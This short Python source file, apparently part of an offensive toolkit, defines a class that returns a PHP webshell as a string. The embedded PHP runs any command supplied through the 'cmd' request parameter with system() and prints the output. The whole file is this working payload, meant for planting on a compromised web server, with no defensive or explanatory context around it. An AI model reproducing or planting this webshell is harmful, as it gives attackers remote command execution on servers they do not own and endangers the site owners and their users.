#################################################################################
# title         : php_basic-get
# description   : Basic PHP webshell that uses GET['cmd'] to pass commands
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
##################################################################################
class Webshell:
    
    @staticmethod
    def get():
        return Webshell.webshell
    
    webshell = (
        "<?php if(isset($_REQUEST['cmd'])){"
        "echo '<pre>';"
        "$cmd = ($_REQUEST['cmd']);"
        "system($cmd);"
        "echo '</pre>';"
        "die;"
        "} ?>"
   ) 
